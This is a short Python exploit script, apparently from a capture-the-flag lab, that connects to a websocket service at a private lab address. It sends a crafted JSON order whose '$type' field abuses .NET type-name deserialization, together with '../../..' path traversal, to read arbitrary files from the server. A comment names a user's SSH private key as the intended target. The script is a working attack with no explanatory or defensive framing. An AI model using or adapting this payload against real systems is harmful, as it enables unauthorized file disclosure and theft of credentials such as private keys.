import websockets
import asyncio
import json
import sys

websocket_url = "ws://10.10.11.201:5000/"

async def lets_talk(input_data):
    async with websockets.connect(websocket_url) as ws:

        await ws.send(json.dumps(input_data))
        recv_msg = await ws.recv()
        # print(f"> {recv_msg}")

        j_data = json.loads(recv_msg)
        if "RemoveOrder" in j_data and "ReadFile" in j_data["RemoveOrder"]:
            data = j_data["RemoveOrder"]["ReadFile"]
            print(data)


if __name__ == "__main__":
    try:
        read_order = {"ReadOrder": "orders.txt"}
        write_order = {"WriteOrder": "New Order"}
        remove_order = {"RemoveOrder": {"$type": "bagel_server.File, bagel","ReadFile": f"../../..{sys.argv[1]}"}}  # /home/phil/.ssh/id_rsa
        asyncio.get_event_loop().run_until_complete(lets_talk(input_data=remove_order))
    except KeyboardInterrupt:
        print(' KeyboardInterrupt')
    except IndexError as e:
        print("Usage: script.py <filename>")
        exit(e)
    except websockets.exceptions.ConnectionClosed as e:
        print(e)
